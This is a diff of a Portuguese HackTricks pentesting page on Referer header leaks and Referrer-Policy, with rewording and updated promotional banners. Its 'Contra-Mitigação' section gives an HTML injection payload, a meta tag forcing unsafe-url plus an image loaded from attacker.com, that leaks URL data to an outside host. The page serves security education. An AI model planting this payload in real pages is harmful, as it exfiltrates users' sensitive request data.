@@ -1,31 +1,29 @@
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+Outras formas de apoiar o HackTricks:
 
-- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
-
-- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 
 # Cabeçalhos de referência e política
 
-O cabeçalho de referência é usado pelos navegadores para indicar qual foi a página anterior visitada.
+Referer é o cabeçalho usado pelos navegadores para indicar qual foi a página anterior visitada.
 
-## Vazamento de informações sensíveis
+## Informações sensíveis vazadas
 
-Se em algum momento dentro de uma página da web alguma informação sensível estiver localizada nos parâmetros de uma solicitação GET, se a página contiver links para fontes externas ou se um invasor puder fazer/sugerir (engenharia social) que o usuário visite uma URL controlada pelo invasor. Ele pode ser capaz de extrair as informações sensíveis dentro da última solicitação GET.
+Se em algum momento dentro de uma página web qualquer informação sensível estiver localizada nos parâmetros de uma requisição GET, se a página contém links para fontes externas ou um atacante for capaz de fazer/sugerir (engenharia social) que o usuário visite uma URL controlada pelo atacante. Ele poderia ser capaz de exfiltrar as informações sensíveis dentro da última requisição GET.
 
 ## Mitigação
 
-Você pode fazer o navegador seguir uma **política de referência** que poderia **evitar** que as informações sensíveis sejam enviadas para outras aplicações da web:
+Você pode fazer o navegador seguir uma **política de referência** que poderia **evitar** que as informações sensíveis sejam enviadas para outras aplicações web:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -36,9 +34,9 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Contra-Medida
+## Contra-Mitigação
 
-Você pode anular essa regra usando uma tag meta HTML (o atacante precisa explorar uma injeção HTML):
+Você pode anular essa regra usando uma meta tag HTML (o atacante precisa explorar uma injeção HTML):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
@@ -46,3 +44,18 @@ Você pode anular essa regra usando uma tag meta HTML (o atacante precisa explor
 ## Defesa
 
 Nunca coloque dados sensíveis dentro de parâmetros GET ou caminhos na URL.
+
+
+<details>
+
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Outras formas de apoiar o HackTricks:
+
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
